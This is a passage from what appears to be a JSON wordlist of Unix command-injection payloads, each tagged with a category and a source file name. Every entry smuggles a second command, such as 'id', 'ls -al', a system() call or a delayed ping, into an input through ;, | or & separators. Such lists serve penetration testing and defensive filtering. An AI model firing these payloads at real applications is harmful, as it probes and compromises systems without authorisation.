    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "|/bin/ls -al",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a);/usr/bin/id",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a;/usr/bin/id",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a);/usr/bin/id;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a;/usr/bin/id;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a);/usr/bin/id|",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a;/usr/bin/id|",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a)|/usr/bin/id",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a|/usr/bin/id",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a)|/usr/bin/id;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": ";system('id')",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": ";system('/usr/bin/id')",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "\"& ping -i 30 127.0.0.1 &\"",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "'& ping -i 30 127.0.0.1 &'",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "; id",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  }
]